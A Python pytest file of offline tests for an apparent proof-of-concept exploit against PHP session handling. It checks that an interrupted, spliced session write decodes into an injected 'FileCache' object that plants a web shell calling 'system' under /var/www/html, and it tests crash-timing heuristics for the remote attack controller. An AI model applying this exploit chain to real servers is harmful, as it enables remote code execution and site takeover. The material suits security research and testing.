"""
Offline unit tests for PHPAfterShell-poc (no docker / no target needed).

They pin down the splice geometry and the session-file grammar that the
exploit relies on: given C = [progress][bio] and R = [progress'][bio] built
from the very same constants the exploit uses, mixing R[:k] || C[k:] must
decode into a session containing the injected FileCache object.
"""
import os
import sys

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(
    os.path.abspath(__file__))), "poc"))

import lab          # noqa: E402
import remote       # noqa: E402


# ------------------------------------------------------- mini php decoder

def _unserialize(buf: bytes, p: int):
    """Minimal PHP unserializer: N b i d s a O (enough for session files).

    Wire formats verified against the lab's PHP 8.4 (see README):
        N;   b:0;   i:42;   d:1.5;
        s:3:"abc";
        a:1:{<key><value>...}
        O:8:"stdClass":1:{<key><value>...}
    Every type except N is followed by ':' before its payload; string/array
    lengths are digit runs optionally followed by another ':' (tolerant on
    purpose so the parser works against either spacing variant).
    """
    t = chr(buf[p])
    p += 1
    if t == "N":
        assert buf[p] == ord(";")
        return None, p + 1
    assert buf[p] == ord(":"), f"expected ':' after {t!r}"
    p += 1

    def digits() -> int:
        nonlocal p
        start = p
        while 48 <= buf[p] <= 57:
            p += 1
        assert p > start, f"no digits for {t!r}"
        n = int(buf[start:p])
        if buf[p] == ord(":"):
            p += 1
        return n

    if t in "bi":
        e = buf.index(b";", p)
        n = int(buf[p:e])
        p = e + 1
        return n, p
    if t == "d":
        e = buf.index(b";", p)
        v = float(buf[p:e])
        return v, e + 1
    if t == "s":
        n = digits()
        assert buf[p] == ord('"')
        p += 1
        v = buf[p:p + n]
        assert buf[p + n] == ord('"') and buf[p + n + 1] == ord(";")
        return v, p + n + 2
    def put(d: dict, k, v) -> None:
        d[k.decode("latin1") if isinstance(k, bytes) else k] = v

    if t == "a":
        n = digits()
        assert buf[p] == ord("{")
        p += 1
        out = {}
        for _ in range(n):
            k, p = _unserialize(buf, p)
            v, p = _unserialize(buf, p)
            put(out, k, v)
        assert buf[p] == ord("}")
        return out, p + 1
    if t == "O":
        nlen = digits()
        assert buf[p] == ord('"')
        p += 1
        cls = buf[p:p + nlen].decode()
        p += nlen + 1                     # skip class + closing quote
        if buf[p] == ord(":"):
            p += 1
        nprops = digits()
        assert buf[p] == ord("{")
        p += 1
        props = {}
        for _ in range(nprops):
            k, p = _unserialize(buf, p)
            v, p = _unserialize(buf, p)
            put(props, k, v)
        assert buf[p] == ord("}")
        return {"__class__": cls, **props}, p + 1
    raise ValueError(f"unsupported type {t!r} at {p - 1}")


def php_session_decode(buf: bytes) -> dict:
    out, p = {}, 0
    while p < len(buf):
        pipe = buf.find(b"|", p)
        assert pipe >= 0, f"missing key delimiter at {p}"
        key = buf[p:pipe].decode("latin1")
        val, p = _unserialize(buf, pipe + 1)
        out[key] = val
    return out


# ------------------------------------------------------------- fixtures

@pytest.fixture(autouse=True)
def small_geometry():
    lab.set_geometry("small")
    yield
    lab.set_geometry("small")


SYNTH_PROGRESS = (
    b'upload_progress_tokTEST00000000000|a:5:{s:10:"start_time";i:1795170886;'
    b's:14:"content_length";i:10267;s:15:"bytes_processed";i:5244;'
    b's:4:"done";b:0;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";'
    b's:4:"name";s:5:"c.txt";s:8:"tmp_name";N;s:5:"error";i:0;'
    b's:4:"done";b:0;s:10:"start_time";i:1795170886;'
    b's:15:"bytes_processed";i:5244;}}}'
)


def make_c() -> tuple[bytes, int]:
    """C = [progress][bio] with the exploit's real payload layout."""
    p_start = len(SYNTH_PROGRESS) + len(b"bio|s:") + len(str(lab.L1)) + len(':"')
    e_off = lab.e_offset()
    payload = lab.build_payload(p_start, e_off)
    c = SYNTH_PROGRESS + f'bio|s:{lab.L1}:"'.encode() + payload + b'";'
    return c, p_start


def make_r(c: bytes, bp: int = 2_000_000) -> bytes:
    """R = [progress'][bio], bio byte-identical to C's."""
    bio = c[c.index(b"bio|"):]
    return lab.r_prefix(bp=bp) + b"G" * lab.LEN2 + lab.r_suffix() + bio


# ----------------------------------------------------------------- tests

def test_window_and_fit():
    assert lab.f_offset() < lab.e_offset()
    c, p_start = make_c()
    # the plant must live inside C
    assert lab.e_offset() < len(c)
    # R must be at least as long as C (no pre-write truncate)
    r = make_r(c)
    assert len(r) >= len(c)
    # the payload fits in the bio record
    payload = lab.build_payload(p_start, lab.e_offset())
    assert len(payload) == lab.L1


def test_payload_plant():
    p_start = len(SYNTH_PROGRESS) + len(b"bio|s:") + len(str(lab.L1)) + len(':"')
    e_off = lab.e_offset()
    payload = lab.build_payload(p_start, e_off)
    rel = e_off - p_start
    assert payload[rel:rel + len(lab.SUFFIX)] == lab.SUFFIX
    obj_at = rel + len(lab.SUFFIX)
    assert payload[obj_at:obj_at + len(lab.obj_bytes())] == lab.obj_bytes()
    c = SYNTH_PROGRESS + f'bio|s:{lab.L1}:"'.encode() + payload + b'";'
    lab.verify_c(c, p_start, e_off, payload)


def test_splice_decodes_to_filecache():
    """The interrupted-write state must decode into the gadget object."""
    c, p_start = make_c()
    r = make_r(c)
    f, e = lab.f_offset(), lab.e_offset()
    assert e < len(c)

    for k in (f + 1000, (f + e) // 2, e - 4096):
        mix = lab.splice(c, r, k)
        assert len(mix) == len(c)
        sess = php_session_decode(mix)
        assert "evil" in sess, f"no evil key for k={k}"
        assert sess["evil"]["__class__"] == "FileCache"
        assert sess["evil"]["path"] == ("/var/www/html"
                                        + lab.shell_path()).encode()
        assert b"system" in sess["evil"]["content"]
        assert "pad" in sess


def test_splice_outside_window_fails_or_misses():
    """k beyond E' must not produce the object (sanity of the window)."""
    c, _ = make_c()
    r = make_r(c)
    # k inside R's progress header area -> decode must not yield evil
    mix = lab.splice(c, r, lab.f_offset() - 1500)
    try:
        sess = php_session_decode(mix)
    except (ValueError, AssertionError):
        return                      # hard failure is fine too
    assert "evil" not in sess


def test_post_max_limits():
    """Every request body must stay below post_max_size (8388608)."""
    for name in ("small", "big"):
        lab.set_geometry(name)
        assert 4 + lab.L1 <= 8388608, f"bio body too big ({name})"
        # real replacement body: progress part + file part headers
        # (including the LEN2-long filename) + trailing data
        repl_body = len(lab.progress_body("F" * lab.LF, "G" * lab.LEN2,
                                          lab.DATA_REPL))
        assert repl_body <= 8388608, f"replacement body too big ({name})"
        assert lab.CL_R >= repl_body, f"CL_R below body ({name})"
        assert lab.CL_R <= 8388608, f"CL_R above post_max_size ({name})"
    lab.set_geometry("small")


def test_bp_digit_stability():
    """f depends only on bp's digit count; the layout keeps it at 7."""
    a = lab.r_prefix(bp=2_000_000)
    b = lab.r_prefix(bp=8_300_000)
    assert len(a) == len(b)
    assert lab.f_offset() == len(a)


def test_classify_file():
    """The no-oracle controller classifies state off the file itself."""
    c, _ = make_c()
    r = make_r(c)

    # nothing written yet: OOM before the pwrite
    assert lab.classify_file(b"", c) == ("empty", None)
    assert lab.classify_file(c, c) == ("early", 0)

    # deterministic splice inside the window: exact k comes back
    k = lab.pick_k(lab.f_offset(), lab.e_offset())
    mix = lab.splice(c, r, k)
    out, kk = lab.classify_file(mix, c)
    assert out == "mix" and kk == k

    # write completed / ran past the window: late at E', never a hit
    assert lab.classify_file(r, c)[0] == "late"
    k2 = lab.e_offset() + 4096
    if k2 < len(c):
        past = lab.splice(c, r, k2)
        assert lab.classify_file(past, c)[0] == "late"


def test_derive_signals():
    """Natural signals map to pressure directions (no target report)."""
    # a decode warning is untrustworthy: hold
    assert remote._derive({"decode_failed": True, "victim": "eof"},
                          [])[0] == "noise"
    # the write completed: the limit was never crossed -> more pressure
    assert remote._derive({"victim": "timeout", "drop_ms": 6006.0},
                          [])[0] == "nooom"
    # death times calibrate the early/late split from this run itself
    times = [120.0, 900.0]           # split = 120 + (900-120)/3 = 380
    fast = {"victim": "eof", "drop_ms": 200.0}
    slow = {"victim": "rst", "drop_ms": 750.0}
    assert remote._derive(fast, times)[0] == "early"   # died before the write
    assert remote._derive(slow, times)[0] == "late"    # died deeper in it
    # no calibration yet: bootstrap threshold
    assert remote._derive({"victim": "eof", "drop_ms": 50.0},
                          [])[0] == "early"
    assert remote._derive({"victim": "eof", "drop_ms": 900.0},
                          [])[0] == "late"


def test_remote_payload_big_geometry():
    lab.set_geometry("big")
    try:
        payload = remote.build_payload()
        assert len(payload) == lab.L1
        e = lab.e_offset()
        # the plant (suffix + object + pad header) must fit inside the bio
        assert e - remote.P_START + 130 < lab.L1
    finally:
        lab.set_geometry("small")
